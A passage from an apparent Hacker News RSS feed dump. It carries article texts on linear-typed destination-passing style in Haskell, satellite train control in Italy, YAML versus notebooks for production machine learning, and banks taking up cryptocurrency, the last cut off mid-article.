Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25075718">thread link</a>) | @lelf
<br/>
November 12, 2020 | https://www.tweag.io/blog/2020-11-11-linear-dps/ | <a href="https://web.archive.org/web/*/https://www.tweag.io/blog/2020-11-11-linear-dps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>My goal today is to convince you that destination-passing style is
neat, actually. And that <a href="https://www.tweag.io/blog/tags/linear-types">linear types</a> make
destination-passing purely functional. But first, I must answer a
question.</p>
<h2>What is destination-passing style?</h2>
<p>If you’ve ever programmed in C, C++, or Fortran, you are sure to have
encountered the style of programming which sometimes goes by the name
<em>destination-passing style</em>. It is the practice of writing, <em>e.g.</em> an
array-producing functions as, instead, taking an empty array as an
extra argument and filling it. Consider, for example, the C <code>strcpy</code> function:</p>
<div data-language="c"><pre><code><span>char</span><span>*</span> <span>strcpy</span> <span>(</span> <span>char</span><span>*</span> destination<span>,</span> <span>const</span> <span>char</span><span>*</span> source <span>)</span><span>;</span></code></pre></div>
<p>It copies the string in <code>source</code> to the array <code>destination</code> (it also
returns <code>destination</code> when it’s done).</p>
<p>The name “destination-passing style” itself seems to be more common in
the functional programming language compilation literature, however. C
programmers don’t appear to have a name for it. So it is likely that
you have never encountered it.</p>
<h2>But this is extremely imperative, why should I care?</h2>
<p>Why, indeed, care about destination-passing? It does let you ask a new
question: “whose responsibility is it to allocate the array?“. If I
were to write an array copy in Haskell, it would have type</p>
<div data-language="haskell"><pre><code><span>copyArray</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>Array</span> <span>a</span></code></pre></div>
<p>And there is no way around <code>copyArray</code> allocating an array itself. The
question doesn’t even exist. With <code>strcpy</code>, I can either choose to
allocate an array, and pass it immediately to <code>strcpy</code>, or, I can
delegate the allocation of the array to someone else.</p>
<p>But, once I can ask this question, what can I do with it? I can
compose it! Let’s imagine that we have a function to split an array in
two</p>
<div data-language="haskell"><pre><code><span>splitArray</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>(</span><span>Array</span> <span>a</span><span>,</span> <span>Array</span> <span>a</span><span>)</span></code></pre></div>
<p>Now consider the following (admittedly not especially useful)
function:</p>
<div data-language="haskell"><pre><code><span>copyArray2</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>Array</span> <span>a</span>
<span>copyArray2</span> <span>a</span> <span>=</span> <span>case</span> <span>splitArray</span> <span>a</span> <span>of</span>
  <span>(</span><span>al</span><span>,</span> <span>ar</span><span>)</span> <span>-&gt;</span> <span>copyArray</span> <span>al</span> <span>&lt;&gt;</span> <span>copyArray</span> <span>ar</span></code></pre></div>
<p>When the question doesn’t exist, each call to <code>copyArray</code> has, no matter what,
to allocate an array, which is then copied into a new array. It means
that we are making a superfluous copy of our original array,
only to discard it immediately. This is quite wasteful.</p>
<h2>Won’t fusion take care of that, though?</h2>
<p>Often, you can, indeed, rely on array fusion to avoid too egregious a
behaviour. Array fusion, such as implemented in the excellent <a href="https://hackage.haskell.org/package/vector">vector</a>
library will eliminate a ton of intermediate allocations.</p>
<p>However, fusion is unreliable. Sometimes, a simple refactoring will
push a function’s size beyond what GHC is willing to inline, and it
will break an entire fusion pipeline. Most of the time, this is fine,
but not when you are dependent on fusion happening. And if you need
GHC to produce code without allocations, why not write your program directly as you want
it, rather than try and coax the compiler into hopefully eliminating
the allocations for you.</p>
<p>This has been a guiding principle in the development of the linear
types project: <strong>compiler optimisations are great, as you don’t need
to think about a lot of things; until you do, and you find yourself
second-guessing the optimiser</strong>. When that happens, we want linear
types to empower you to write the code that you mean, without
sacrificing Haskell’s type safety.</p>
<p>Besides, in the <a href="https://dl.acm.org/doi/abs/10.1145/3122948.3122949">article about F̃</a>, a restricted array-based
functional language which compiles to very efficient code, the authors
find significant performance gains for using destination-passing on
top of an array fusion optimisation. They only use destination-passing
in the optimiser, though, not as a language feature.</p>
<p>Finally, fusion doesn’t always work. Suppose I rewrite my <code>copyArray2</code>
function to use threads to better utilise my multicore architecture</p>
<div data-language="haskell"><pre><code><span>copyArray3</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>IO</span> <span>(</span><span>Array</span> <span>a</span><span>)</span>
<span>copyArray3</span> <span>=</span> <span>case</span> <span>splitArray</span> <span>a</span> <span>of</span>
  <span>(</span><span>al</span><span>,</span> <span>ar</span><span>)</span> <span>-&gt;</span> <span>do</span>
    <span>(</span><span>bl</span><span>,</span> <span>br</span><span>)</span> <span>&lt;-</span> <span>concurrently</span>
      <span>(</span><span>evaluate</span> <span>$</span> <span>copyArray</span> <span>al</span><span>)</span>
      <span>(</span><span>evaluate</span> <span>$</span> <span>copyArray</span> <span>ar</span><span>)</span>
    <span>return</span> <span>$</span> <span>bl</span> <span>&lt;&gt;</span> <span>br</span></code></pre></div>
<p>This is beyond a fusion framework ability to optimise. Or maybe I want
to copy my array into a memory mapped buffer. The point is: fusion
will do a lot for you, just not everything.</p>
<h2>Ok, but does that mean I have to use ST everywhere?</h2>
<p>The obvious way to encode destination-passing style, in Haskell, is to
move all our computation to <code>ST</code>, so that <code>copyArray</code> would be</p>
<div data-language="haskell"><pre><code><span>copyArray</span> <span>::</span> <span>STArray</span> <span>s</span> <span>a</span> <span>-&gt;</span> <span>STArray</span> <span>s</span> <span>a</span> <span>-&gt;</span> <span>ST</span> <span>(</span><span>)</span></code></pre></div>
<p>But it’s not very congruent with how functional programmers write
their programs. It does lift all of the above limitations, at the
price of adding state everywhere, which is an entire error-inducing
surface that functional programming usually avoids.</p>
<p>It’s a huge price to pay, and that’s why the <a href="https://hackage.haskell.org/package/vector">vector</a> library is not
structured like this. It does feature mutable arrays, but immutable
arrays are very much encouraged.</p>
<p>This is where <a href="https://www.tweag.io/blog/tags/linear-types">linear types</a> help. Indeed, let’s take a
step back and ask: what makes a destination impure to begin with?</p>
<ul>
<li>If I read out a cell, then write to it, then read it again: I’ll see a
different result the second time.</li>
<li>If I write to the same cell twice, the writes need to be ordered,
otherwise the result would be non-deterministic.</li>
<li>Reading a cell which has not been initialised is non-deterministic
(though in most case, we can salvage this by initialising every cell
with <code>undefined</code>)</li>
</ul>
<p>All of these behaviours are prohibited in pure code. But we could
avoid all the prohibited behaviours if we could make sure that each
cell is written to exactly once before being read. Aha! Exactly once,
this is the sort of thing that linear types are good at! Ok, so let’s
try again:</p>
<div data-language="haskell"><pre><code><span>copyArray</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>DArray</span> <span>a</span> ⊸ <span>(</span><span>)</span></code></pre></div>
<p>This means that <code>copyArray</code> is a <em>pure</em> function which uses its destination
(in its entirety) exactly once. We only need to make sure that there
is only ever a unique pointer to a destination array, which we do with
the <code>alloc</code> function:</p>
<div data-language="haskell"><pre><code><span>alloc</span> <span>::</span> <span>Int</span> <span>-&gt;</span> <span>(</span><span>DArray</span> <span>a</span> ⊸ <span>(</span><span>)</span><span>)</span> ⊸ <span>Array</span> <span>a</span></code></pre></div>
<p>A destination is allocated for the scope of the linear function. At
the end of the function, we know that the destination has been fully
filled, and so we get an array out. From this destination-passing
version of <code>copyArray</code>, by the way, it is easy to retrieve the
direct style variant:</p>
<div data-language="haskell"><pre><code><span>copyArray</span>' <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>Array</span> <span>a</span>
<span>copyArray</span>' <span>a</span> <span>=</span> <span>alloc</span> <span>(</span><span>length</span> <span>a</span><span>)</span> <span>(</span><span>\</span><span>d</span> <span>-&gt;</span> <span>copyArray</span> <span>a</span> <span>d</span><span>)</span></code></pre></div>
<p>The reverse, as I’ve been arguing throughout this post, is very much
not true. So the destination-passing function is the more fundamental
one.</p>
<p>Now, to be able to implement <code>copyArray2</code>, we need a function which
splits destinations</p>
<div data-language="haskell"><pre><code><span>splitDArray</span> <span>::</span> <span>DArray</span> <span>a</span> ⊸ <span>(</span><span>DArray</span> <span>a</span><span>,</span> <span>DArray</span> <span>a</span><span>)</span></code></pre></div>
<p>Then, it is just a matter of following the types (the curious-looking <code>&amp; \case</code> construction is due to a limitation of the current
implementation of linear types in GHC, see <a href="https://github.com/tweag/linear-base/blob/8642e4209ffd663e1f1f35ddd977da0d073fa1af/docs/USER_GUIDE.md#case-statements-are-not-linear">here</a>)</p>
<div data-language="haskell"><pre><code><span>copyArray2</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>DArray</span> <span>a</span> ⊸ <span>(</span><span>)</span>
<span>copyArray2</span> <span>a</span> <span>d</span> <span>=</span> <span>case</span> <span>splitArray</span> <span>a</span> <span>of</span>
  <span>(</span><span>al</span><span>,</span> <span>ar</span><span>)</span> <span>-&gt;</span> <span>splitDArray</span> <span>d</span> <span>&amp;</span> <span>\</span><span>case</span>
    <span>(</span><span>dl</span><span>,</span> <span>dr</span><span>)</span> <span>-&gt;</span> <span>copyArray</span> <span>al</span> <span>dl</span> <span>`lseq`</span> <span>copyArray</span> <span>ar</span> <span>dr</span></code></pre></div>
<p>Voilà! No superfluous allocation. Not because of the optimiser, but
because of the semantics of my program: it doesn’t allocate an array
anywhere.</p>
<p>You’ll find a more complete destination array interface in <a href="https://github.com/tweag/linear-base/blob/191badef5c92aaa44a7f311b0c9978fc144622f1/src/Data/Array/Destination.hs">the
<code>Data.Array.Destination</code> module of linear-base</a>.</p>
<h2>Closing thoughts</h2>
<p>One of the features of linear types, is that they often allow to
expose as pure interfaces objects which appear to be intrinsically
impure. But I want to argue that, in the case of destinations, we’ve
actually done more than this: we’ve made the interface <em>better</em> than
the impure interface. Not because pure interfaces are better than
impure interfaces (though it’s a defensible position), but because the
linear destination interface is a more faithful representation of what
destinations mean.</p>
<p>There is no longer confusion about what is an input and what is an
output: inputs are <code>Array</code>, and outputs are <code>DArray</code>. Destinations are
there solely for output, they can’t be used as a temporary store of
data. And the types ensure that they are fully filled, and that we
don’t accidentally overwrite an output, by the time the destination is
read back as an array.</p>
<p>And this is pretty neat.</p>
<p>If you want to go a bit deeper into this particular brand of weed, let
me leave you with a handful of comments which you can take either as
closing this blog post, or opening new avenues.</p>
<ul>
<li>The <code>alloc</code> function takes a destination-consuming function as an
argument, instead of returning a destination directly. This style is
common in Linear Haskell, as a means to enforce uniqueness. It is
sometimes seen as a limitation of Linear Haskell’s design. However
in this particular case, the function is necessary to <em>delimit the
scope</em> of the destination. In fact, the <code>alloc</code> function is
virtually identical to that of the <a href="https://dl.acm.org/doi/abs/10.1145/3122948.3122949">F̃ article</a>, where there
is no linear typing whatsoever.</li>
<li>Affine types (affine arguments are consumed <em>at most</em> once,
rather than <em>exactly</em> once for linear arguments) are sometimes
preferable to linear types. For instance affine types appear to
<a href="https://www.tweag.io/blog/2018-06-21-linear-streams/">represent streaming
computations better</a>. But
in the case of destinations we really do want linear types: it
wouldn’t make as much sense to return from <code>alloc</code> with a
partially-filled destination.</li>
<li>When using linear types to make a pure interface to array functions
which, in fact, mutate an array for efficiency (like in <a href="https://github.com/tweag/linear-base/blob/191badef5c92aaa44a7f311b0c9978fc144622f1/src/Data/Array/Mutable/Linear.hs">this module
of linear
base</a>),
we lose the ability to alias the mutable array in exchange for
purity. Sometimes it’s a perfectly acceptable trade-off, but some
algorithms depend on sharing mutation for efficiency, these are not
available with linear pure mutable arrays. We are not making such a
trade-off for destinations: linear destinations, being pure output,
are, arguably, a more faithful interface for destination-passing
style than mutable array.</li>
<li>
<p>Have you noticed how in the destination-passing <code>copyArray2</code>, the
call to array concatenation from the direct-style implementation has
been replaced by a call to <code>splitDArray</code>? And, if you have, have you
also noticed the symmetry between these two functions?</p>
<div data-language="haskell"><pre><code><span>uncurry</span> <span>(</span><span>&lt;&gt;</span><span>)</span> <span>::</span> <span>(</span><span>Array</span> <span>a</span><span>,</span> <span>Array</span> <span>a</span><span>)</span> <span>-&gt;</span> <span>Array</span> <span>a</span>
<span>splitDArray</span> <span>::</span> <span>Darray</span> <span>a</span> ⊸ <span>(</span><span>DArray</span> <span>a</span><span>,</span> <span>DArray</span> <span>a</span><span>)</span></code></pre></div>
<p>This is not a coincidence. There is a sort of duality between
destinations and constructors. This …</p></li></ul></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.tweag.io/blog/2020-11-11-linear-dps/">https://www.tweag.io/blog/2020-11-11-linear-dps/</a></em></p>]]>
            </description>
            <link>https://www.tweag.io/blog/2020-11-11-linear-dps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25075718</guid>
            <pubDate>Thu, 12 Nov 2020 22:03:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Trains in Italy to be tracked and controlled via space]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25075333">thread link</a>) | @finphil
<br/>
November 12, 2020 | https://nuadox.com/post/634615317096710144/trains-in-italy-tracked-and-controlled-by-satellites | <a href="https://web.archive.org/web/*/https://nuadox.com/post/634615317096710144/trains-in-italy-tracked-and-controlled-by-satellites">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="634615317096710144">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/634615317096710144/trains-in-italy-tracked-and-controlled-by-satellites"><h2>Trains in Italy to be tracked and controlled via space</h2></a>
                                <figure data-orig-width="1920" data-orig-height="1280"><img src="https://64.media.tumblr.com/b4f89edf40673685a7cc1905aaef43ea/15de201cd5d5d058-0b/s1280x1920/96ebbdebadfb6f2986c6f304dcb9c523eaf530db.png" alt="image" data-orig-width="1920" data-orig-height="1280" width="1280" height="853"></figure><p><b>- By&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.esa.int%2F&amp;t=N2FlMDdmZmMyYmY5NTI1YmRiOWI4OWE0N2ZjYmViOWNjMWJhMmQ0MSwwOVBpSDFCUg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F634615317096710144%2Ftrains-in-italy-tracked-and-controlled-by-satellites&amp;m=0&amp;ts=1605443184">European Space Agency</a> -</b></p><p>

Trains in Italy will be tracked and controlled via space to ensure they run in a safe, punctual and environmentally friendly way.<br></p><p>The project could see satellite technology become a standard way to run trains across the whole of Europe.<br></p><p>The Italian national railway company, Gruppo FS Italiane, is installing systems that will use satellites to monitor the speed of trains on its lines and automatically control the signals ahead to slow any engine that is going too fast. The satellites will add capacity to the existing trackside radio systems.</p><p>The satellites will also monitor the distances between trains to avoid any collisions. The system will be more energy efficient than existing measures and therefore better for the environment.</p><p>Trains making the 40-kilometre journey between the Italian cities of Novara in the Piedmont region and Rho in the Lombardy region will be the first to use the system, which was originally conceived in 2012 and has since undergone an extensive test campaign.</p><p>The project, called ERSAT, is part of the European Rail Traffic Management System, an EU initiative to integrate the separate national rail networks into a coherent Europe-wide system. Once it has demonstrated its success, it will allow satellite technologies to be certified for use under the scheme. This would increase the efficiency of the system, cutting costs and electricity use, and thereby reducing carbon emissions.</p><p>The ERSAT project is being implemented in coordination with the Italian Space Agency, with the support of ESA, and with the contribution of the EU’s European Global Navigation Satellite Systems Agency.</p><p>–</p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.esa.int%2FApplications%2FTelecommunications_Integrated_Applications%2FSatellites_to_track_trains_and_promote_rail_safety&amp;t=Mjc3MjBiNzZlNDlmNjE2YzY5NGFlZTRiZjQ1ZjE2NzE0NGNkMTU4OCwwOVBpSDFCUg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F634615317096710144%2Ftrains-in-italy-tracked-and-controlled-by-satellites&amp;m=0&amp;ts=1605443184">European Space Agency</a></b></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/178182912782/alstom-first-hydrogen-train">Alstom introduces the first hydrogen train</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/trains">trains</a>
                                    
                                        <a href="https://nuadox.com/tagged/train">train</a>
                                    
                                        <a href="https://nuadox.com/tagged/satellite">satellite</a>
                                    
                                        <a href="https://nuadox.com/tagged/space">space</a>
                                    
                                        <a href="https://nuadox.com/tagged/ersat">ersat</a>
                                    
                                        <a href="https://nuadox.com/tagged/italy">italy</a>
                                    
                                        <a href="https://nuadox.com/tagged/transit">transit</a>
                                    
                                        <a href="https://nuadox.com/tagged/transport">transport</a>
                                    
                                        <a href="https://nuadox.com/tagged/transportation">transportation</a>
                                    
                                    </p>
                                </span></p>
                                
<ol><!-- START NOTES --><!-- END NOTES --></ol></div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/634615317096710144/trains-in-italy-tracked-and-controlled-by-satellites</link>
            <guid isPermaLink="false">hacker-news-small-sites-25075333</guid>
            <pubDate>Thu, 12 Nov 2020 21:29:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why we use YAML, not notebooks, for machine learning]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25075305">thread link</a>) | @sheepstrat
<br/>
November 12, 2020 | http://www.cortex.dev/post/yaml-not-notebooks-for-machine-learning | <a href="https://web.archive.org/web/*/http://www.cortex.dev/post/yaml-not-notebooks-for-machine-learning">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div content-type="article"><p>Most data scientists spend the majority of their working hours in a notebook. As a result, most production machine learning platforms prioritize notebook support. If you try out a new production ML platform, chances are its onboarding tutorial will begin with a .ipynb file.</p><p>When we built <a href="https://github.com/cortexlabs/cortex" target="_blank">Cortex</a> we spent a lot of time considering the correct interface for defining production ML pipelines. Ultimately, we decided <em>not</em> to support notebooks, opting instead for YAML config files.</p><h3>Notebooks were designed for experimentation</h3><p>Notebooks are the modern incarnation of literate programming, a paradigm introduced in the ‘80s that sought to write code that reflected the programmer’s thoughts—not the computer’s processing—by combining code with natural language.</p><p>In all literate programming tools, the emphasis is on presentation, which is a big reason why notebooks are so useful.</p><p>For many data scientists, the finished product of a work session is a business analysis. They need to show team members—who oftentimes aren’t technical—how their data became a specific recommendation or insight.</p><p>A notebook, where paragraphs of formatted text can lay between cells of code and where charts can be displayed directly beneath the code that generates them, is an ideal format for this presentation.</p><p>Even better, notebooks are interactive. Want to see what the chart looks like with a second dataset? Just add a new cell. Want to test a different model? Tweak one line of code and rerun the cell.</p><p>However, the same qualities that make notebooks great for exploring and explaining data make them a poor fit for production.</p><h3>Why we use YAML for production machine learning</h3><p>When I say production machine learning, I’m referring to machine learning that manifests as a product feature. For example, Uber’s ETA prediction, or Gmail’s Smart Compose.</p><p>The priorities in building a production machine learning pipeline—the series of steps that take you from raw data to product—are not fundamentally different from those of general software engineering. Specifically, they are:</p><h4>1. Your pipeline should be reproducible</h4><p>Reproducibility is an issue with notebooks. Because of the hidden state and the potential for arbitrary execution order, generating a result in a notebook isn’t always as simple as clicking “Run All.” Just having another engineer reproduce your results—let alone having your code run automatically as part of a pipeline—is a significant challenge.</p><p>Instead of trying to streamline a notebook’s various imports and function calls into a more easily reproducible script, why not use something simple and declarative like YAML?</p><p>For example, this this cortex.yaml file defines the deployment stage of a pipeline:</p><p>The code to be executed, predictor.py, is clear, as are its configuration variables. It’s simple, readable, and will produce predictable results.</p><p>Now, there are some projects focused on parameterizing notebooks so that they can be treated as pure functions, but it’s always felt like an unnecessary “square peg in a round hole” effort to me.</p><h4>2. Collaborating on your pipeline should be easy</h4><p>Version control is at the heart of any modern engineering org. The ability for multiple engineers to asynchronously contribute to a codebase is crucial—and with notebooks, it’s very hard.</p><p>Git works by tracking the plaintext differences between file versions. With code, this results in a very readable experience, where you can easily visualize what is changing and how it impacts the software:</p><figure id="w-node-d5436ba7f36f-258b12d0"><p><img src="https://uploads-ssl.webflow.com/5f6030edfd63364a668b1265/5fada6aeb4f157689fec70b5_1*q3gmY030tYrPFREYhjuGXA.png" alt=""></p><figcaption><a href="https://github.com/cortexlabs/cortex" target="_blank"></a></figcaption></figure><p>Notebook files, however, are essentially giant JSON documents that contain the base-64 encoding of images and binary data. For a complex notebook, it would be extremely hard for anyone to read through a plaintext diff and draw meaningful conclusions—a lot of it would just be rearranged JSON and unintelligible blocks of base-64.</p><p>When you combine this with the frailty of complicated notebooks, where cells often need to be run in an arbitrary but precise order to generate the right result, it makes collaboration tricky.</p><p>For example, imagine you had an ETA prediction feature, and your pipeline relied on a complicated notebook to export a trained model. No one would be able to work on the notebook, as any small tweak might lead to invisible but cascading changes, such that your model performs poorly.</p><p>Trying to reverse engineer what changes caused the performance drop would be hopeless, both because of the unreadable nature of notebook diffs and because of the explainability problems mentioned earlier. Your pipeline would, in essence, have a “don’t touch it or it will break” sign on it.</p><p>With YAML, however, this problem is solved. There is no hidden state or arbitrary execution order in a YAML file, and any changes you make to it can easily be tracked by Git:</p><figure id="w-node-e3057d2124b7-258b12d0"><p><img src="https://uploads-ssl.webflow.com/5f6030edfd63364a668b1265/5fada6aefc44fcdc3d9da40a_1*KJDREXDrxueoMiPyfjewhg.png" alt=""></p><figcaption><a href="https://github.com/cortexlabs/cortex" target="_blank"></a></figcaption></figure><p>If one of those changes breaks your model, it’s both reversible and investigable.</p><p>As with the last example, there are some projects dedicated to making diffing and merging notebooks easier, but it seems like a lot of effort to emulate YAML’s default nature.</p><h4>3. All code in your pipeline should be testable</h4><p>Connected to both of the above points, most modern engineering orgs (hopefully) have a process for testing code. Typically, it looks something like this:</p><ul role="list"><li>Engineers write tests before pushing any code.</li><li>PRs are automatically reviewed by CI/CD tooling.</li><li>A final manual review is given by another engineer.</li></ul><p>As a result, anytime the codebase is changed, it is done with the highest possible level of confidence that it will not break things.</p><p>With notebooks, this is difficult.</p><p>Python unit testing libraries, like unittest, can be used within a notebook, but standard CI/CD tooling has trouble dealing with notebooks for the same reasons that notebook diffs are hard to read.</p><p>As a result, it’s hard to ship a new notebook to production with a high level of confidence that it won’t break anything—and if something does break, good luck figuring out why.</p><p>Applying CI/CD to YAML files and the code they reference, on the other hand, is straightforward. Devops teams have been doing it for years.</p><h3>Production machine learning is an engineering discipline</h3><p>We built Cortex specifically because we wanted to build things like Spotify’s “Made For You” playlist or Gmail’s Smart Compose. Our focus was not on designing new models, but on building a pipeline to turn models into products.</p><p>To do that, we needed to build an interface that allowed users to specify which code should be executed at what time, with which configuration.</p><p>YAML and notebooks are both tools for that purpose, in a sense. A notebook, at a very basic level, is just a bunch of JSON that references blocks of code and the order in which they should be executed.</p><p>But notebooks prioritize presentation and interactivity at the expense of reproducibility. YAML is the other side of that coin, ignoring presentation in favor of simplicity and reproducibility—making it much better for production.</p><p>‍</p></div></div>]]>
            </description>
            <link>http://www.cortex.dev/post/yaml-not-notebooks-for-machine-learning</link>
            <guid isPermaLink="false">hacker-news-small-sites-25075305</guid>
            <pubDate>Thu, 12 Nov 2020 21:27:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[California Road Charge Phased Demonstration]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25075052">thread link</a>) | @gscott
<br/>
November 12, 2020 | http://www.caroadcharge.com/projects/california-four-phase-demonstration/ | <a href="https://web.archive.org/web/*/http://www.caroadcharge.com/projects/california-four-phase-demonstration/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://www.caroadcharge.com/projects/california-four-phase-demonstration/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25075052</guid>
            <pubDate>Thu, 12 Nov 2020 21:06:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[It’s Not Long Before Your Bank Will Begin Accepting Bitcoin and Crypto]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25074935">thread link</a>) | @URfejk
<br/>
November 12, 2020 | https://www.cryptovantage.com/news/its-not-long-before-your-bank-will-begin-accepting-bitcoin-and-crypto/ | <a href="https://web.archive.org/web/*/https://www.cryptovantage.com/news/its-not-long-before-your-bank-will-begin-accepting-bitcoin-and-crypto/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                            <div>
                                <div><p dir="ltr">This is a difficult question to answer, since no major bank has given any concrete indication that it plans to begin accepting and holding actual deposits in cryptocurrency. However, with <a href="https://www.cryptovantage.com/news/paypal-bitcoin-is-big-news-for-crypto-but-exchanges-have-a-big-edge/" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.cryptovantage.com/news/paypal-bitcoin-is-big-news-for-crypto-but-exchanges-have-a-big-edge/&amp;source=gmail&amp;ust=1604594295417000&amp;usg=AFQjCNEXjCqoMJV5LPR9bVZNhvwsvn3HXg">PayPal launching cryptocurrency trading/holding services</a>, it must be only a matter of time before they begin offering their own similar services, for fear of being left behind.</p>
<h2 dir="ltr">Silvergate Bank Profits From Accepting Crypto Business</h2>
<p dir="ltr">Silvergate Bank was one of the first traditional financial institutions to get in on the act of accepting business from cryptocurrency firms. Back in Q4 2017, <a href="https://www.forbes.com/sites/michaeldelcastillo/2020/10/26/silvergate-breaks-record-with-586-million-in-cryptocurrency-deposits/?sh=1c86b3395cc3" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.forbes.com/sites/michaeldelcastillo/2020/10/26/silvergate-breaks-record-with-586-million-in-cryptocurrency-deposits/?sh%3D1c86b3395cc3&amp;source=gmail&amp;ust=1604594295417000&amp;usg=AFQjCNHGkH26Ap1B-mB51eGqDH2wM_BpHQ">it took in $835 million in deposits from crypto companies</a>.</p>
<p dir="ltr">This remains its record, but after falling in the months following Q4 2017, its crypto-related deposits have begun climbing up again this year. Not only did it accept $586 million in deposits from crypto firms, but <a href="http://d18rn0p25nwr6d.cloudfront.net/CIK-0001312109/ae7d42e6-6304-4c40-a07d-ef393c80c445.pdf" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=http://d18rn0p25nwr6d.cloudfront.net/CIK-0001312109/ae7d42e6-6304-4c40-a07d-ef393c80c445.pdf&amp;source=gmail&amp;ust=1604594295417000&amp;usg=AFQjCNG7t35yFTgpJ4-azduYImlxDURbUw">its fees from digital currency customers increased by 107%</a> (or by $2.1 million) in the year to June 30, 2020, rising from $2 million to $4.1 million.</p>
<p dir="ltr">In other words, the bank has doubled its cryptocurrency business over the past year, and recent events elsewhere in the world of crypto suggest that this business will only continue growing.</p>
<p dir="ltr">“The Bank’s infrastructure has provided Silvergate with the foundation to succeed in what has become a very digital world and we see an ample runway for further growth,” <a href="https://markets.ft.com/data/announce/detail?dockey=600-202010260625BIZWIRE_USPRX____BW5227-1" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://markets.ft.com/data/announce/detail?dockey%3D600-202010260625BIZWIRE_USPRX____BW5227-1&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNGYLsM56ADZH4gF8FvhIYjZeTHXEA">said Alan Lane</a>, the bank’s CEO.</p>
<p dir="ltr">That there’s an ample runway for further growth is indicated by a number of market and regulatory developments.</p>
<p dir="ltr">Most notably, the price of bitcoin has jumped by over 30% in less than 30 days, with BTC costing $10,552 on October 8 and touching as high as $15,909 November 5.</p>
<p dir="ltr"><img tabindex="0" src="https://lh6.googleusercontent.com/miITOPXIeQF1FKAOPmFwdjB_HSVUZBcSts5F18wxDSrpua8sotqsXlvBXWm86JE2_ZNP_X_9ZzfABY8ZhfteD580w6XwN-9QkvNVqkGmf_l0vBZdGMkXt_ZyeMA3I6z2-dU2bFyR" width="624" height="365"></p>
<p dir="ltr"><em>Source: CoinGecko</em></p>
<p dir="ltr">This growth has been spurred by a number of factors which will continue to push bitcoin’s price higher, such as PayPal’s aforementioned announcement, as well as <a href="https://www.cryptovantage.com/news/square-follows-microstrategy-buys-50-million-worth-of-bitcoin/" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.cryptovantage.com/news/square-follows-microstrategy-buys-50-million-worth-of-bitcoin/&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNHF2m3P48ZJKH_S_-KzCFKilKrf2w">recent moves by the likes of MicroStrategy and Square to make bitcoin a reserve asset.</a></p>
<p dir="ltr">But on the regulatory side, the <a href="https://www.occ.gov/news-issuances/news-releases/2020/nr-occ-2020-98.html" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.occ.gov/news-issuances/news-releases/2020/nr-occ-2020-98.html&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNHFmiPt9-a-o4pPC2s4CEFupfpRew">U.S. Office of the Comptroller of the Currency announced in July</a> that federally chartered banks may provide cryptocurrency custody services.</p>
<p dir="ltr">“The OCC has found that the authority to provide safekeeping services extends to digital activities and, specifically, that national banks may escrow encryption keys used in connection with digital certificates because a key escrow service is a functional equivalent to physical safekeeping,” it wrote in a letter.</p>
